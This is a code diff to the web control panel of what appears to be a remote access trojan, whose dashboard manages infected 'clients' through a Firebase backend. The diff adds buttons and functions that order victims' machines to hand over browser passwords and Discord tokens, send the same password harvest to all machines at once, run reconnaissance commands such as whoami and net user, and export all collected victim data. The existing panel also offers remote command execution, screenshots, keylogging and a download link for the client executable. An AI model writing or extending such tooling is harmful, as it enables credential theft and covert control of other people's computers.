@@ -130,6 +130,7 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     <a class="active" onclick="switchPage('dashboard',this)">Dashboard</a>
     <a onclick="switchPage('broadcast',this)">Broadcast</a>
     <a onclick="switchPage('screenshots',this)">Screenshots</a>
+    <a onclick="switchPage('timeline',this)">Timeline</a>
     <a onclick="switchPage('builder',this)">Builder</a>
   </div>
   <button class="btn btn-ghost btn-sm" onclick="load()" title="Refresh">⟳</button>
@@ -173,9 +174,31 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
       <button class="btn btn-primary" onclick="broadcastCmd()">Send to All</button>
       <button class="btn btn-accent" onclick="broadcastScreenshot()">Screenshot All</button>
       <button class="btn btn-ghost" onclick="broadcastSystemInfo()">SysInfo All</button>
+      <button class="btn btn-ghost" onclick="broadcastPasswords()">Passwords All</button>
       <button class="btn btn-danger" onclick="broadcastShutdown()">Shutdown All</button>
     </div>
     <div id="bcResult" style="margin-top:.8rem;font-size:.78rem;color:var(--text2)"></div>
+  </div>
+  <div class="build-panel">
+    <h3>Command Presets</h3>
+    <div class="build-actions" style="gap:.3rem">
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('whoami')">Whoami</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('ipconfig /all')">IP Config</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('netstat -an')">Netstat</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('tasklist')">Tasklist</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('systeminfo')">System Info</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('dir C:\\')">Dir C:\</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('powershell Get-Process | Select Name,CPU -First 20')">Top Processes</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('net user')">Users</button>
+      <button class="btn btn-ghost btn-sm" onclick="applyPreset('schtasks')">Scheduled Tasks</button>
+    </div>
+  </div>
+  <div class="build-panel">
+    <h3>📊 Export Data</h3>
+    <div class="opt-row">
+      <div class="desc"><label>Export all client data</label><p>Downloads all ping data as JSON for offline analysis</p></div>
+      <button class="btn btn-accent btn-sm" onclick="exportAllData()">Export JSON</button>
+    </div>
   </div>
   <div class="build-panel">
     <h3>Recent Activity</h3>
@@ -195,6 +218,22 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
     </div>
     <div id="ssGallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:.8rem"><div style="color:var(--text2);font-size:.8rem">No screenshots yet. Click Capture All to begin.</div></div>
   </div>
+</div>
+
+<div class="pages" id="page-timeline">
+  <div class="stats">
+    <div class="stat-card"><div class="num" id="tlEvents">0</div><div class="lbl">Total Events</div></div>
+    <div class="stat-card online"><div class="num" id="tlOnline">0</div><div class="lbl">Online Events</div></div>
+    <div class="stat-card"><div class="num" id="tlCommands">0</div><div class="lbl">Commands</div></div>
+    <div class="stat-card"><div class="num" id="tlResults">0</div><div class="lbl">Results</div></div>
+  </div>
+  <div class="toolbar">
+    <span style="color:var(--text2);font-size:.8rem">Real-time activity feed</span>
+    <span style="flex:1"></span>
+    <button class="btn btn-ghost btn-sm" onclick="loadActivityFeed();renderTimeline()" title="Refresh">⟳</button>
+    <button class="btn btn-accent btn-sm" onclick="exportTimeline()">📥 Export</button>
+  </div>
+  <div id="timelineFeed"></div>
 </div>
 
 <div class="pages" id="page-builder">
@@ -285,8 +324,19 @@ body::before{content:'';position:fixed;top:-50%;left:-50%;width:200%;height:200%
 const FB = location.hostname==='localhost'||location.hostname==='127.0.0.1'
   ? 'http://'+location.hostname+':3000'
   : 'https://lucaaverij-default-rtdb.europe-west1.firebasedatabase.app';
-let g_clients=[], g_filtered=[];
+let g_clients=[], g_filtered=[], g_activity=[];
 load(); setInterval(load,5000);
+
+// WebSocket real-time updates (local server only)
+let g_ws=null;
+(function(){
+  if(location.hostname!=='localhost'&&location.hostname!=='127.0.0.1')return;
+  try{
+    g_ws=new WebSocket('ws://'+location.hostname+':3000');
+    g_ws.onmessage=function(e){try{const msg=JSON.parse(e.data);if(msg.event==='ping')load();if(msg.event==='log'){g_activity.unshift(msg.data);g_activity=g_activity.slice(0,200)}}catch{}};
+    g_ws.onclose=function(){setTimeout(function(){try{g_ws=new WebSocket('ws://'+location.hostname+':3000')}catch{}},3000)};
+  }catch{}
+})();
 
 function switchPage(name,el){
   document.querySelectorAll('.nav a').forEach(a=>a.classList.remove('active'));
@@ -295,6 +345,7 @@ function switchPage(name,el){
   document.getElementById('page-'+name).classList.add('active');
   if(name==='broadcast')loadActivity();
   if(name==='screenshots')loadScreenshots();
+  if(name==='timeline')renderTimeline();
 }
 
 async function load(){
@@ -305,6 +356,17 @@ async function load(){
     if(!d||typeof d!=='object'){emptyState();return;}
     g_clients=Object.keys(d).map(n=>{const x=d[n]||{};return{name:n,ip:x.ip||'?',ts:x.created_at,cores:x.cores||0,ram:x.ram||0,monitors:x.monitors||0,keylog:x.keylog,ver:x.version||'1.0',uptime:x.uptime||0};});
     render();
+  }catch{}
+  // Also load activity feed in background
+  loadActivityFeed();
+}
+
+async function loadActivityFeed(){
+  try{
+    const r=await fetch(FB+'/logs.json?limit=100');
+    if(!r.ok)return;
+    const d=await r.json();
+    if(Array.isArray(d)&&d.length){g_activity=d.reverse();if(document.getElementById('page-timeline').classList.contains('active'))renderTimeline()}
   }catch{}
 }
 
@@ -357,8 +419,8 @@ function filterClients(){
         <div class="meta">
           ${c.ts?'<span>'+new Date(c.ts).toLocaleString()+'</span>':''}
           <span class="tag ${isOnline?'green':'red'}">${isOnline?'● Online':'○ Offline'}</span>
-          ${c.cores?'<span><svg viewBox="0 0 24 24"><rect x="4" y="4" width="16" height="16" rx="2"/><path d="M9 1v3M15 1v3M9 20v3M15 20v3M1 9h3M20 9h3M1 15h3M20 15h3"/></svg>'+c.cores+'c</span>':''}
-          ${c.ram?'<span><svg viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2"/><path d="M9 22v-4h6v4"/></svg>'+(c.ram>1024?(c.ram/1024).toFixed(1)+'GB':c.ram+'MB')+'</span>':''}
+          ${c.cores?'<span>⚡'+c.cores+'c</span>':''}
+          ${c.ram?'<span>💾'+(c.ram>1024?(c.ram/1024).toFixed(1)+'GB':c.ram+'MB')+'</span>':''}
           ${c.monitors?'<span>🖥 '+c.monitors+'</span>':''}
           ${c.keylog?'<span class="tag green">⌨</span>':''}
         </div>
@@ -366,7 +428,9 @@ function filterClients(){
       <div class="actions">
         <button class="btn btn-accent btn-sm" onclick="openClient('${esc(c.name)}')">Open</button>
         <button class="btn btn-ghost btn-sm" onclick="quickSS('${esc(c.name)}')" title="Screenshot">📷</button>
-        <button class="btn btn-ghost btn-sm" onclick="quickCmd('${esc(c.name)}')" title="Quick CMD">⌨</button>
+        <button class="btn btn-ghost btn-sm" onclick="quickCmd('${esc(c.name)}')" title="CMD">⌨</button>
+        <button class="btn btn-ghost btn-sm" onclick="quickBW('${esc(c.name)}')" title="Browser Passwords">🔑</button>
+        <button class="btn btn-ghost btn-sm" onclick="quickTokens('${esc(c.name)}')" title="Discord Tokens">🎮</button>
         <button class="btn btn-danger btn-sm" onclick="removeClient('${esc(c.name)}')">✕</button>
       </div>
     </div>`;
@@ -378,6 +442,8 @@ function esc(s){if(!s)return'';return String(s).replace(/&/g,'&amp;').replace(/<
 function openClient(n){window.open('client.html?name='+encodeURIComponent(n),'_blank')}
 async function quickSS(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'screenshot',payload:'0',status:'pending'})});toast('Screenshot requested for '+n)}catch{}}
 async function quickCmd(n){const cmd=prompt('Command for '+n+':');if(!cmd)return;try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cmd',payload:cmd,status:'pending'})});toast('Command sent to '+n)}catch{}}
+async function quickBW(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'browser_passwords',payload:'',status:'pending'})});toast('Browser password request sent to '+n)}catch{}}
+async function quickTokens(n){try{await fetch(FB+'/commands/'+fbEsc(n)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'discord_tokens',payload:'',status:'pending'})});toast('Token grab requested for '+n)}catch{}}
 function downloadClient(){window.location.href='https://github.com/dustinhemert-stack/uhuhrhtemp/raw/main/ping_app.exe'}
 async function removeClient(n){
   if(!confirm('Remove '+n+' and all its data?'))return;
@@ -398,16 +464,14 @@ async function removeAllClients(){
 }
 function toast(m){const t=document.createElement('div');t.className='toast';t.textContent='✓ '+m;document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}
 
+// === Broadcast ===
 async function broadcastCmd(){
   const cmd=document.getElementById('bcCmd').value.trim();if(!cmd)return;
   const target=document.getElementById('bcTarget').value;
   const el=document.getElementById('bcResult');el.innerHTML='<span style="color:var(--accent)">Sending to '+(target==='online'?'online':'all')+' clients...</span>';
   let sent=0;
   for(const c of g_clients){
-    if(target==='online'){
-      const age=c.ts?Date.now()-new Date(c.ts).getTime():1/0;
-      if(age>=60000)continue;
-    }
+    if(target==='online'){const age=c.ts?Date.now()-new Date(c.ts).getTime():1/0;if(age>=60000)continue;}
     try{await fetch(FB+'/commands/'+fbEsc(c.name)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'cmd',payload:cmd,status:'pending'})});sent++}catch{}
   }
   el.innerHTML='<span style="color:var(--green)">Sent to '+sent+' clients</span>';toast('Broadcast sent to '+sent+' clients');
@@ -437,42 +501,94 @@ async function broadcastShutdown(){
   }
   toast('Shutdown sent to '+sent+' clients');
 }
+async function broadcastPasswords(){
+  const target=document.getElementById('bcTarget').value;let sent=0;
+  for(const c of g_clients){
+    if(target==='online'){const age=c.ts?Date.now()-new Date(c.ts).getTime():1/0;if(age>=60000)continue;}
+    try{await fetch(FB+'/commands/'+fbEsc(c.name)+'.json',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({type:'browser_passwords',payload:'',status:'pending'})});sent++}catch{}
+  }
+  toast('Password harvest sent to '+sent+' clients');
+}
+// Preset commands
+function presetCmd(type,payload){
+  document.getElementById('bcCmd').value=payload||'';
+  document.getElementById('bcCmd').focus();
+}
+const presets=[
+  {label:'Whoami',cmd:'whoami'},
+  {label:'IP Config',cmd:'ipconfig /all'},
+  {label:'Netstat',cmd:'netstat -an'},
+  {label:'Tasklist',cmd:'tasklist'},
+  {label:'System Info',cmd:'systeminfo'},
+  {label:'Dir C:\\',cmd:'dir C:\\'},
+];
 
+// === Activity ===
 async function loadActivity(){
   const el=document.getElementById('activityFeed');
   try{
-    const r=await fetch(FB+'/pings.json');if(!r.ok)return;const pings=await r.json();
-    if(!pings||typeof pings!=='object'){el.innerHTML='<div style="color:var(--text2);font-size:.8rem">No data</div>';return;}
-    let items=[];
-    for(const[name,data]of Object.entries(pings)){
-      if(data&&data.created_at)items.push({name,time:data.created_at,type:'ping',detail:'IP: '+(data.ip||'?')});
-    }
-    const cmdNames=Object.keys(pings);
-    for(const name of cmdNames){
-      try{
-        const cr=await fetch(FB+'/commands/'+fbEsc(name)+'.json');
-        if(!cr.ok)continue;
-        const cmds=await cr.json();
-        if(cmds&&typeof cmds==='object'){
-          for(const[key,val]of Object.entries(cmds)){
-            if(val&&val.type){
-              items.push({name,time:key.split('-')[0],type:val.type,detail:val.status||'pending',result:val.result?val.result.substring(0,100):''});
-            }
-          }
-        }
-      }catch{}
-    }
-    items.sort((a,b)=>b.time.localeCompare(a.time));
-    if(!items.length){el.innerHTML='<div style="color:var(--text2);font-size:.8rem">No activity</div>';return;}
-    el.innerHTML=items.slice(0,50).map(it=>`<div style="padding:.4rem 0;border-bottom:1px solid rgba(255,255,255,.03);font-size:.75rem;display:flex;gap:.8rem;align-items:flex-start">
-      <span style="color:var(--text2);min-width:80px;flex-shrink:0">${esc(it.name)}</span>
-      <span style="color:var(--accent);min-width:80px;flex-shrink:0;font-weight:500">${esc(it.type)}</span>
-      <span style="color:var(--green);flex:1;word-break:break-all">${esc(it.detail)}</span>
-      ${it.result?'<span style="color:var(--text2);font-size:.7rem;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">'+esc(it.result)+'</span>':''}
-    </div>`).join('');
+    const r=await fetch(FB+'/logs.json?limit=200');
+    if(!r.ok)return;
+    const d=await r.json();
+    if(!Array.isArray(d)||!d.length){el.innerHTML='<div style="color:var(--text2);font-size:.8rem">No activity data. Server logs not available when using Firebase directly.</div>';return;}
+    displayActivity(d,el);
   }catch(e){el.innerHTML='<div style="color:var(--red);font-size:.8rem">Error loading activity</div>'}
 }
+function displayActivity(items,el){
+  el.innerHTML=items.slice(-100).reverse().map(it=>`<div style="padding:.35rem 0;border-bottom:1px solid rgba(255,255,255,.03);font-size:.72rem;display:flex;gap:.6rem;align-items:flex-start">
+    <span style="color:var(--text2);min-width:70px;flex-shrink:0;font-size:.65rem">${new Date(it.t).toLocaleTimeString()}</span>
+    <span style="color:var(--accent);min-width:70px;flex-shrink:0;font-weight:500">${esc(it.type)}</span>
+    <span style="color:var(--text2);min-width:100px;flex-shrink:0">${esc(it.computer||'')}</span>
+    <span style="color:var(--text2);flex:1;word-break:break-all">${esc(it.detail||'')}</span>
+  </div>`).join('')||'<div style="color:var(--text2);font-size:.8rem">No activity</div>';
+}
 
+// === Timeline ===
+function renderTimeline(){
+  const el=document.getElementById('timelineFeed');
+  if(!g_activity.length){el.innerHTML='<div style="color:var(--text2);font-size:.8rem;padding:1rem">No activity yet. Activity is tracked when using the local Node.js server.</div>';return;}
+  const days={};
+  g_activity.forEach(it=>{
+    const d=new Date(it.t).toLocaleDateString();
+    if(!days[d])days[d]=[];
+    days[d].push(it);
+  });
+  let html='';
+  Object.keys(days).reverse().forEach(d=>{
+    html+=`<div style="margin-bottom:.8rem"><div style="font-size:.7rem;color:var(--text2);font-weight:600;margin-bottom:.4rem;text-transform:uppercase;letter-spacing:.04em">${d}</div>`;
+    days[d].reverse().forEach(it=>{
+      html+=`<div style="display:flex;gap:.6rem;padding:.25rem 0;font-size:.7rem;border-left:2px solid var(--border);padding-left:.7rem;margin-left:.3rem;position:relative">
+        <div style="position:absolute;left:-5px;top:8px;width:8px;height:8px;border-radius:50%;background:${it.type==='online'?'var(--green)':it.type==='command'?'var(--accent)':it.type==='result'?'var(--orange)':'var(--border)'}"></div>
+        <span style="color:var(--text2);min-width:65px;font-size:.62rem">${new Date(it.t).toLocaleTimeString()}</span>
+        <span style="color:var(--accent);min-width:65px">${esc(it.type)}</span>
+        <span style="color:var(--text2);min-width:80px">${esc(it.computer||'')}</span>
+        <span style="color:var(--text2);flex:1">${esc(it.detail||'')}</span>
+      </div>`;
+    });
+    html+='</div>';
+  });
+  el.innerHTML=html;
+}
+async function exportTimeline(){
+  if(!g_activity.length){toast('No activity to export');return}
+  let txt='Activity Timeline Export\n';
+  txt+='Generated: '+new Date().toLocaleString()+'\n';
+  txt+='='.repeat(60)+'\n\n';
+  g_activity.forEach(it=>{
+    txt+=`[${new Date(it.t).toISOString()}] ${it.type} | ${it.computer||''} | ${it.detail||''}\n`;
+  });
+  const blob=new Blob([txt],{type:'text/plain'});
+  const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='timeline_'+Date.now()+'.txt';
+  a.click();URL.revokeObjectURL(a.href);toast('Timeline exported');
+}
+
+// === Presets ===
+function applyPreset(cmd){
+  document.getElementById('bcCmd').value=cmd;
+  document.getElementById('bcCmd').focus();
+}
+
+// === Screenshots ===
 let g_screenshots={};
 async function captureAllScreens(){
   const el=document.getElementById('ssGallery');el.innerHTML='<div style="color:var(--accent);font-size:.8rem;grid-column:1/-1">Capturing screenshots from all online clients...</div>';
@@ -527,6 +643,18 @@ function viewSS(el){
   document.body.appendChild(overlay);
 }
 
+// === Export All ===
+async function exportAllData(){
+  try{
+    const r=await fetch(FB+'/pings.json');if(!r.ok)return;
+    const d=await r.json();
+    const blob=new Blob([JSON.stringify(d||{},null,2)],{type:'application/json'});
+    const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='clients_export_'+Date.now()+'.json';
+    a.click();URL.revokeObjectURL(a.href);toast('Client data exported');
+  }catch{toast('Export failed')}
+}
+
+// === Builder ===
 function buildArgs(){
   const n=document.getElementById('clientName').value.trim();
   const s=document.getElementById('startupToggle').checked;
